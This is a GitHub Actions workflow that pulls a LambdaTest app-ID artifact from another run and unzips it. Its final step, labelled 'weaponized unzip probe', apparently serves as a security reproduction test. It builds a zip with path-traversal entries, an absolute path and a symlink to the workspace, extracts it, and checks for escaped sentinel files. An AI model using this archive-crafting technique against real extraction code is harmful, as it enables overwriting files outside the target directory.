name: WDIO-like repro

on:
  workflow_dispatch:
  workflow_run:
    workflows: ["Upload iOS NRTestApp to LambdaTest"]
    types:
      - completed

permissions:
  contents: read

jobs:
  ios-data:
    runs-on: ubuntu-latest
    if: ${{ (github.event_name == 'workflow_dispatch') || (github.event_name == 'workflow_run' && github.event.workflow_run.conclusion == 'success') }}
    env:
      LT_USERNAME: ${{ secrets.LAMBDA_USERNAME }}
      LT_ACCESSKEY: ${{ secrets.LAMBDA_ACCESS_KEY }}
    steps:
      - uses: actions/checkout@1e31de5234b9f8995739874a8ce0492dc87873e2
      - name: unzip implementation
        run: unzip -v | head -2
      - name: Download LambdaTest app ID artifact (from workflow_run)
        if: github.event_name == 'workflow_run'
        uses: actions/github-script@v7
        with:
          script: |
            const artifacts = await github.rest.actions.listWorkflowRunArtifacts({
              owner: context.repo.owner,
              repo: context.repo.repo,
              run_id: context.payload.workflow_run.id,
            });
            const matchArtifact = artifacts.data.artifacts.filter((artifact) => {
              return artifact.name == "lambdatest-app-id"
            })[0];
            if (matchArtifact) {
              const download = await github.rest.actions.downloadArtifact({
                owner: context.repo.owner,
                repo: context.repo.repo,
                artifact_id: matchArtifact.id,
                archive_format: 'zip',
              });
              const fs = require('fs');
              const path = require('path');
              const artifactDir = path.join(process.env.RUNNER_TEMP, 'artifacts');
              fs.mkdirSync(artifactDir, { recursive: true });
              fs.writeFileSync(path.join(artifactDir, 'app-id.zip'), Buffer.from(download.data));
              console.log('artifact downloaded: ' + matchArtifact.id);
            } else {
              console.log('no matching artifact');
            }
      - name: Extract app ID (from workflow_run)
        if: github.event_name == 'workflow_run'
        run: |
          if [ -f "${{ runner.temp }}/artifacts/app-id.zip" ]; then
            mkdir -p "${{ runner.temp }}/artifacts/LambdaTest"
            unzip -q "${{ runner.temp }}/artifacts/app-id.zip" -d "${{ runner.temp }}/artifacts/LambdaTest"
            echo "Extracted app ID from workflow_run artifact"
          fi
        continue-on-error: true
      - name: Set LT_APP_ID environment variable
        run: |
          APP_ID_FILE="${{ runner.temp }}/artifacts/LambdaTest/last-app-id"
          if [ -f "$APP_ID_FILE" ]; then
            APP_ID="$(tr -d '\n' < "$APP_ID_FILE")"
            if echo "$APP_ID" | grep -Eq '^[A-Za-z0-9._:-]{1,200}$'; then
              echo "LT_APP_ID=$APP_ID" >> $GITHUB_ENV
              echo "Using app ID: $APP_ID"
            else
              echo "Artifact app ID is invalid; tests will use default app ID from config"
            fi
          else
            echo "No app ID artifact found, tests will use default app ID from config"
          fi
      - name: weaponized unzip probe (mid-path dotdot + symlink escape)
        run: |
          python3 - <<'PY'
          import zipfile, os, stat
          d = os.environ['RUNNER_TEMP'] + '/probe'
          os.makedirs(d + '/target', exist_ok=True)
          z = zipfile.ZipFile(d + '/evil.zip', 'w')
          z.writestr('x/../../../ESCAPED_MIDPATH.txt', 'escaped-midpath')
          z.writestr('x/../../deep/../../ESCAPED_MIDPATH2.txt', 'escaped-midpath2')
          z.writestr('/ABS_ESCAPED.txt', 'escaped-absolute')
          zi = zipfile.ZipInfo('slink')
          zi.create_system = 3
          zi.external_attr = (stat.S_IFLNK | 0o777) << 16
          z.writestr(zi, os.environ['GITHUB_WORKSPACE'])
          zi2 = zipfile.ZipInfo('slink/ESCAPED_THROUGH_SYMLINK.txt')
          zi2.create_system = 3
          zi2.external_attr = 0o644 << 16
          z.writestr(zi2, 'escaped-symlink')
          z.close()
          print('probe zip built')
          PY
          mkdir -p "$RUNNER_TEMP/probe/target"
          unzip -q "$RUNNER_TEMP/probe/evil.zip" -d "$RUNNER_TEMP/probe/target"
          echo "unzip_exit=$?"
          echo "--- extraction tree"; find "$RUNNER_TEMP/probe" -maxdepth 4 | sort
          echo "--- escape sentinels outside target:"
          find /home/runner/work "$RUNNER_TEMP" -name 'ESCAPED_*' -not -path '*/probe/target/*' 2>/dev/null | sort
          echo "--- symlink inside target:"; ls -l "$RUNNER_TEMP/probe/target" || true
          echo "workspace=$GITHUB_WORKSPACE"
